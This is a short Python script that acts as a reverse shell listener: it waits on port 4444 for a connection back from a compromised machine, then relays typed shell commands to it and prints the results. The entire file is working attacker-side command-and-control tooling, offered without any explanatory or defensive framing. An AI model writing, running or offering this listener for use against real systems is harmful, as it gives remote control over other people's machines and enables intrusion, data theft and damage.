import socket

host = '0.0.0.0'
port = 4444

print(f"Reverse shell listener started on {host}:{port}")
print("Waiting for connection...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)

conn, addr = s.accept()
print(f"\n[+] Connection received from {addr[0]}:{addr[1]}")
print("[+] Reverse shell active! Type commands below.\n")

import time

try:
    while True:
        conn.settimeout(0.1)
        try:
            while True:
                conn.recv(4096)
        except socket.timeout:
            pass
        
        cmd = input("> ")
        if not cmd:
            continue
        if cmd.lower() in ['exit', 'quit']:
            conn.send(b'exit\n')
            break
        
        conn.send((cmd + '\n').encode())
        
        output_received = False
        buffer = b''
        try:
            conn.settimeout(5)
            while True:
                data = conn.recv(4096)
                if data:
                    buffer += data
                    if b'__CMD_END__' in buffer:
                        output = buffer.split(b'__CMD_END__')[0].decode('utf-8', errors='ignore')
                        if output.strip():
                            output_received = True
                            print(output, end='')
                        buffer = b''
                        break
                else:
                    break
        except socket.timeout:
            if buffer:
                output = buffer.decode('utf-8', errors='ignore')
                if output.strip():
                    output_received = True
                    print(output, end='')
            if not output_received:
                print("(No output)")
        except:
            break
except KeyboardInterrupt:
    print("\n[!] Closing connection...")

conn.close()
s.close()
print("[!] Listener closed")

